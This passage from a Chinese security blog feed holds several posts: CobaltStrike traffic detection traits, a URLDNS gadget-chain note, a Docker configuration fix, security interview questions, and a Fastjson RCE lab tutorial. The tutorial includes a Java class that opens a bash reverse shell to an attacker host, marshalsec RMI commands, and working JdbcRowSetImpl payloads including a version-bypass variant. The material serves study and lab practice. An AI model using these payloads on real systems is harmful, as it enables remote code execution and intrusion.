/cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client <span class="punctuation">&#123;</span></span><br><span class="line">        # base64 encode session metadata and store it in the Cookie header.</span><br><span class="line">        metadata <span class="punctuation">&#123;</span></span><br><span class="line">            base64;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">        # server should send output with no changes</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/octet-stream&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output <span class="punctuation">&#123;</span></span><br><span class="line">            print;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2025/06/d7dc72328b20ce817a315ecc908974f6.webp" alt="CobaltStrike 流量分析与入侵检测"></p><h3 id="https证书">https证书</h3><p>https-beacon通信中，默认情况下使用空证书建立加密通信</p><p><img src="https://image.icewindy.cn/2025/06/6a1c959be7cabea5a4743ecae1ec3ce7.webp" alt="CobaltStrike 流量分析与入侵检测"></p><h3 id="dns异常返回值">dns异常返回值</h3><p>dns-beacon通信中，默认使用 “cdn.”、“www6.”、“api.”、“www.”、“post.” 为开头发起 dns 请求，并且查询结果伴随 0.0.0.0、0.0.0.80、0.0.0.241 等非常规 IP 。</p><p><img src="https://image.icewindy.cn/2025/06/90ae7d030f094d118fd886fe151c7c81.webp" alt="CobaltStrike 流量分析与入侵检测"></p><h2 id="强特征-需修改源码">强特征（需修改源码）</h2><h3 id="chechsum8">chechsum8</h3><p>采用staging模式的CS木马会向指定的服务器随机符合checksum8规则（路径的 ascii 之和与 256 取余计算值等于 92 ）的路径下载stage。即使修改下载地址，但c2服务器依然会对符合checksum8规则的地址作出响应。</p><p><img src="https://image.icewindy.cn/2025/06/469e20c6d665153a0bc415831ed7b0ce.webp" alt="CobaltStrike 流量分析与入侵检测"></p><h3 id="ja3-ja3s">ja3/ja3s</h3><p>ja3 和 ja3s 分别代表 tls 握手阶段的 client-hello、server-hello 的数据集合计算出的哈希值（md5），相同版本相同系统下指纹相同，该特征与操作系统、cobaltstrike 版本有关，profile 文件无法对其修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># win10-https-beacon-ja3 指纹：72a589da586844d7f0818ce684948eea</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2025/06/0ec7450b093fb714ad7f551a738684ab.webp" alt="CobaltStrike 流量分析与入侵检测"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># centos-cs4.4-ja3s 指纹：fd4bc6cea4877646ccd62f0792ec0b62</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2025/06/5aa59d94f5cef14273a3337d76f48d86.webp" alt="CobaltStrike 流量分析与入侵检测"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 蓝队 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透+应急靶机：vulntarget-m</title>
      <link href="/2025/05/27/%E6%B8%97%E9%80%8F-%E5%BA%94%E6%80%A5%E9%9D%B6%E6%9C%BA%EF%BC%9Avulntarget-m/"/>
      <url>/2025/05/27/%E6%B8%97%E9%80%8F-%E5%BA%94%E6%80%A5%E9%9D%B6%E6%9C%BA%EF%BC%9Avulntarget-m/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机拓扑图及配置">靶机拓扑图及配置</h2><p><img src="https://image.icewindy.cn/2025/05/da2a004bae0949da0684cc0302064bed." alt="图片"></p><p>靶机配置：<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247490554&amp;idx=1&amp;sn=4405de5d10e421cf7d0ed51e2e298eb4&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247490554&amp;idx=1&amp;sn=4405de5d10e421cf7d0ed51e2e298eb4&amp;scene=21#wechat_redirect</a></p><h2 id="入口机1">入口机1</h2><h3 id="尝试获取立足点">尝试获取立足点</h3><p><img src="https://image.icewindy.cn/2025/05/d5293e53f1c01053842d5a0ec7bd313f.png" alt="image-20250527205047040"></p><p>通过fscan扫描发现一个nacos网页和两个nacos漏洞</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS反序列化利用链</title>
      <link href="/2025/05/09/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2025/05/09/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="urldns">URLDNS</h2><p><code>URLDNS</code>为ysoserial工具中的一条反序列化利用链，一般用于检测是否存在反序列化漏洞。</p><p>该利用链有以下特点：</p><ul><li>不限制JDK版本，不使用第三方依赖</li><li>只能发起DNS请求，不能进行其他利用，只能验证是否存在反序列化</li></ul><p>ysoserial源码中列出的利用链为如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>其调用链为：<code>Deserializer.deserialize() -&gt; HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode() -&gt; getHostAddress()</code></p><p>最终通过<code>getHostAddress()</code>发出dns请求。</p><p>参考：</p><ul><li><a href="https://www.freebuf.com/articles/network/337124.html">告别脚本小子系列丨JAVA安全(6)——反序列化利用链（上） - FreeBuf网络安全行业门户</a></li><li><a href="https://www.freebuf.com/articles/web/371930.html">Java反序列化：URLDNS的反序列化调试分析 - FreeBuf网络安全行业门户</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>/etc/docker/deamon.json文件修改后重启Docker服务不生效解决方案</title>
      <link href="/2025/04/20/docker%E7%9A%84deamon-json%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9%E5%90%8E%E9%87%8D%E5%90%AFDocker%E6%9C%8D%E5%8A%A1%E4%B8%8D%E7%94%9F%E6%95%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2025/04/20/docker%E7%9A%84deamon-json%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9%E5%90%8E%E9%87%8D%E5%90%AFDocker%E6%9C%8D%E5%8A%A1%E4%B8%8D%E7%94%9F%E6%95%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="环境">环境</h2><ul><li>Ubuntu22.04 LTS</li><li>Docker Engine Community Version 28.1.0</li></ul><h2 id="问题介绍">问题介绍</h2><p>参照了网上众多教程配置Docker daemon.json文件，基本都是一种方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line">// 修改相关配置文件</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>都是修改配置文件后，重载daemon和重启docker服务。以前使用这种方法是没问题，不知道为什么最近用相同的方法已经无法使用了，使用docker info查看Mirrors之类的配置也是为空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info|grep Mirrors -A 1</span><br></pre></td></tr></table></figure><h2 id="解决方案">解决方案</h2><p>在折磨了我解决一个小时之后，我在网上找到了一篇解决方案</p><p><a href="https://blog.csdn.net/m0_56022510/article/details/140736285">【踩坑】Docker deamon.json 文件修改之后重启不生效_docker daemon.json 不生效-CSDN博客</a></p><p>总而言之就是，直接重启没用了，首先要停止docker.service和docer.socket这两个服务，再重新启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl stop docker.service</span><br><span class="line">sudo systemctl stop docker.socket</span><br><span class="line">sudo systemctl start docker.service</span><br><span class="line">sudo systemctl start docker.socket</span><br></pre></td></tr></table></figure><p>然后配置就正常生效了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info|grep Mirrors -A 1</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  https://xxx.xxx.xxx/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Server配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson RCE漏洞</title>
      <link href="/2025/04/20/FastjsonRCE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/20/FastjsonRCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="fastjson漏洞">Fastjson漏洞</h2><h3 id="判断是否使用fastjson">判断是否使用Fastjson</h3><p>本次测试以vulhub提供的版本1.2.24和1.2.45为例</p><ol><li><p>单<code>&#123;</code>报错</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">192.168</span><span class="number">.200</span><span class="number">.130</span>:<span class="number">8090</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">385</span></span><br><span class="line"></span><br><span class="line">\u007B</span><br></pre></td></tr></table></figure><p>在1.2.24版本，使用非闭合的<code>&#123;</code>会导致500报错</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">500</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Date</span>: <span class="title class_">Sun</span>, <span class="number">20</span> <span class="title class_">Apr</span> <span class="number">2025</span> <span class="number">14</span>:<span class="number">01</span>:<span class="number">08</span> <span class="variable constant_">GMT</span></span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">161</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;timestamp&quot;</span>: <span class="number">1745157668563</span>,</span><br><span class="line">  <span class="string">&quot;status&quot;</span>: <span class="number">500</span>,</span><br><span class="line">  <span class="string">&quot;error&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>,</span><br><span class="line">  <span class="string">&quot;message&quot;</span>: <span class="string">&quot;syntax error, expect &#123;, actual error, pos 0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在1.2.45版本会有Fastjson版本号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">400</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Date</span>: <span class="title class_">Sun</span>, <span class="number">20</span> <span class="title class_">Apr</span> <span class="number">2025</span> <span class="number">14</span>:<span class="number">02</span>:<span class="number">30</span> <span class="variable constant_">GMT</span></span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">320</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;timestamp&quot;</span>: <span class="number">1745157750630</span>,</span><br><span class="line">  <span class="string">&quot;status&quot;</span>: <span class="number">400</span>,</span><br><span class="line">  <span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad Request&quot;</span>,</span><br><span class="line">  <span class="string">&quot;message&quot;</span>: <span class="string">&quot;JSON parse error: syntax error, expect &#123;, actual error, pos 0, fastjson-version 1.2.45; nested exception is com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual error, pos 0, fastjson-version 1.2.45&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用DOS模式</p><ul><li>原理：Fastjson &lt; 1.2.60 在取不到值的时候会填充 <code>\u001a</code> 。</li><li>在请求体中写入<code>&#123;&quot;a&quot;:&quot;\x</code>，会导致触发DOS，响应时间会远长于正常响应。我这边测试正常情况下是5ms响应，在触发DOS的情况下是950ms，接近1s。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">192.168</span><span class="number">.200</span><span class="number">.130</span>:<span class="number">8090</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">385</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;\x</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2025/04/8cea939eea197ae6abd087990cdf2c5a.png" alt="响应时间接近1s"></p></li><li><p>dnslog回显</p><p>我这边测试的时候发现，用dnslog回显的时候，需要将数据包内字符串转换为unicode编码才可以正常回显。dnslog分为三种payload，1.2.67版本前后版本和畸形的。</p><ul><li><p>1.2.67版本前</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;dnslog&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">192.168</span><span class="number">.200</span><span class="number">.130</span>:<span class="number">8090</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">385</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;test&quot;</span>:&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u006A\u0061\u0076\u0061\u002E\u006E\u0065\u0074\u002E\u0049\u006E\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073&quot;</span>,<span class="string">&quot;\u0076\u0061\u006C&quot;</span>:<span class="string">&quot;\u0065\u0038\u0030\u0039\u0039\u0062\u0034\u0038\u0030\u0035\u0038\u0032\u0039\u0064\u0062\u0030\u002E\u0067\u006F\u0062\u0079\u0067\u006F\u002E\u006E\u0065\u0074&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2025/04/91ce6992b1f7b40f46cfd68616d2db15.png" alt="image-20250420222133446"></p></li><li><p>1.2.67版本后</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;dnslog&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;dnslog&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>畸形</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;dnslog&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="探测fastjson版本">探测Fastjson版本</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure><p>如果依然为500报错，可以尝试对<code>@type</code>进行unicode编码。</p><h3 id="rce方法">RCE方法</h3><p>需要准备的内容：</p><ul><li>JDK8</li><li><a href="https://github.com/mbechler/marshalsec">marshalsec</a>工具(需要自行使用Maven编译<code>mvn clean package -DskipTests</code>)</li><li>IDEA（或其他Java IDE）</li></ul><p><strong>编写远程类：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Getshell.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Getshell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i&gt;&amp; /dev/tcp/192.168.200.132/2333 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译Getshell.java(<code>javac GetShell.java</code>)得到Getshell.class。在Getshell.class的目录下启动一个Web服务器，并启动一个RMI服务器加载远程类<code>Getshell.class</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br><span class="line"></span><br><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.200.132:8000/<span class="comment">#Getshell 9999</span></span><br></pre></td></tr></table></figure><p>再启动netcat监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 2333</span><br></pre></td></tr></table></figure><h4 id="1-2-24版本getshell">1.2.24版本GetShell</h4><p>发送payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">192.168</span><span class="number">.200</span><span class="number">.130</span>:<span class="number">8090</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">385</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">       <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://192.168.200.132:9999/Getshell&quot;</span>,</span><br><span class="line">       <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到netcat已成功GetShell</p><p><img src="https://image.icewindy.cn/2025/04/531e01281c0d167a081be2d945777243.png" alt="image-20250423204732028"></p><h4 id="1-2-47前版本getshell">&lt;=1.2.47前版本GetShell</h4><p>1.2.24后版本加入了反序列化白名单，但在1.2.48前的版本可以通过构造特殊json绕过检测</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">192.168</span><span class="number">.200</span><span class="number">.130</span>:<span class="number">8090</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">385</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">   <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">       <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">       <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://192.168.200.132:9999/Getshell&quot;</span>,</span><br><span class="line">       <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功Getshell</p><p><img src="https://image.icewindy.cn/2025/04/598600ef81228a37ebfc5f830d5c9553.png" alt="image-20250423211257839"></p><p>其他版本绕过和不出网详解可以参考<a href="https://xz.aliyun.com/news/14309">Java中Fastjson各版本漏洞对抗史与总结-先知社区</a></p><h4 id="不出网总结">不出网总结</h4><p>主要利用<code>BCEL</code>字节码进行绕过。<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><ul><li>Tomecat回显</li><li>Spring echo回显</li><li>TemlplatesImpl Class</li><li>ibatis组件</li></ul><h3 id="漏洞原理">漏洞原理</h3><p>fastjson解析客户端发送过来的json的时候，由于AutoType功能，fastjson会通过读取<code>@type</code>的内容，尝试将json反序列化成这个对象，并且会调用这个类的setter方法。可以利用这个特性，构造出一个JSON字符串，使用<code>@type</code>指定一个可以构造恶意利用链的类，造成远程代码执行。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HVV面试题-2024、2025</title>
      <link href="/2024/03/25/HVV%E9%9D%A2%E8%AF%95%E9%A2%98-2024%E3%80%812025/"/>
      <url>/2024/03/25/HVV%E9%9D%A2%E8%AF%95%E9%A2%98-2024%E3%80%812025/</url>
      
        <content type="html"><![CDATA[<h2 id="国誉2024初筛">国誉2024初筛</h2><h3 id="用过什么安全设备">用过什么安全设备</h3><h3 id="给你一个登录框-可能有什么漏洞">给你一个登录框，可能有什么漏洞</h3><ul><li>sql注入、xss、csrf、会话劫持</li></ul><h3 id="sql注入的类型">sql注入的类型</h3><ul><li>字符、布尔、报错、时间盲注、联合、堆叠、宽字节、XFF</li></ul><h3 id="错误注入使用的方法有哪些">错误注入使用的方法有哪些</h3><ul><li>extractValue、updateXml、floor</li></ul><h3 id="宽字节注入的编码格式是什么">宽字节注入的编码格式是什么</h3><ul><li>GBK</li></ul><h3 id="时间盲注不能使用工具或者脚本-怎么样注入较快">时间盲注不能使用工具或者脚本，怎么样注入较快</h3><ul><li>尝试外带查询</li><li>优化查询策略采用二分查找法</li><li>简化数据集</li></ul><h3 id="sqlmap的level和risk有什么区别-level各个等级代表什么意思">sqlmap的level和risk有什么区别，level各个等级代表什么意思</h3><ul><li>–level和–risk是数字愈大级别越高，–level有1-5，–risk有1-3</li><li>level侧重点在于注入点。risk侧重点在于注入的方法和攻击者愿意承担的风险。</li><li>level默认等级会测试get和post请求中的参数。level2会测cookie。level3会测ua和refferer。level4-5会测各种payload和边界条件。</li><li>risk默认等级安全第一，风险低，只测默认的几种注入方法。risk2会尝试更多类型的注入，如时间盲注等。risk3会尝试更多方式的注入，有可能会更新数据库中的数据，使用时需要谨慎。</li></ul><h3 id="验证码有什么缺陷">验证码有什么缺陷</h3><img src="https://image.icewindy.cn/2024/06/14c4999851266cb42842284b90e5beb5.jpeg" alt="img" style="zoom: 67%;" /><h3 id="一个企业需要做暴露面处理-需要注意哪些地方">一个企业需要做暴露面处理，需要注意哪些地方</h3><ul><li>资产全面梳理</li><li>网络分段和隔离</li><li>开放端口号等</li><li>供应链风险管理</li></ul><h3 